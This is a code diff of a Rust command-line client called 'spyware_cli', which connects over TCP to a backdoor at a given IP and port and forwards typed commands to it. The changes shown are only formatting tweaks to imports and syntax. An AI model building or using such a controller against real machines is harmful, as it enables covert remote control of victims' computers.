@@ -2,13 +2,12 @@ mod commanding;
 mod commands;
 mod connection;
 
+use commanding::handle_user_command;
 use connection::connect_to_backdoor;
-use std::{io};
+use std::io;
+use std::io::{stdout, ErrorKind, Write};
 use std::net::{Shutdown, TcpStream};
 use structopt::StructOpt;
-use std::io::{stdout, Write, ErrorKind};
-use commanding::handle_user_command;
-
 
 #[derive(StructOpt)]
 #[structopt(name = "spyware_cli")]
@@ -17,7 +16,7 @@ struct Opt {
     ip: String,
     /// Destination port of backdoor to connect to
     #[structopt(short, long, default_value = "13337")]
-    port: u16
+    port: u16,
 }
 
 fn run_cli_prompt(stream: &mut TcpStream) -> io::Result<()> {
@@ -33,14 +32,12 @@ fn run_cli_prompt(stream: &mut TcpStream) -> io::Result<()> {
 
         if user_command.len() > 0 {
             match handle_user_command(&user_command, stream) {
-                Ok(_) => {},
+                Ok(_) => {}
                 Err(error) => match error.kind() {
                     // This error is raised when the user enters "exit"
-                    ErrorKind::InvalidInput => {
-                        return Ok(())
-                    }
+                    ErrorKind::InvalidInput => return Ok(()),
                     _ => {}
-                }
+                },
             }
         }
 
